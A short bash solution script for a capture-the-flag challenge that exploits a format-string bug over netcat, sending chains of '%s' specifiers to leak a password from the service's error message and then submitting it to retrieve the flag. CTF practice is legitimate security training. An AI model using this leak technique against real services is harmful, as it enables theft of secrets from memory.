#!/usr/bin/env bash

HOST=${1:-localhost}
PORT=${2:-4444}

PREVIOUS=""

MESSAGE="flag"
while true; do
    MESSAGE+=" %s"
    RESPONSE=$(echo "$MESSAGE" | nc $HOST $PORT | sed -n -r "s/.*Incorrect password. '(.*)' Access denied.*/\1/p")
    NEXT=${RESPONSE:${#PREVIOUS}+1}

    echo "Found String: '$NEXT'"
    RESULT="$(echo "flag $NEXT" | nc $HOST $PORT)"

    if [[ $RESULT == *"WPCTF{"* ]]; then
        echo "Found flag: $RESULT"
        exit 0
    fi

    PREVIOUS="$RESPONSE"
    sleep 1
done
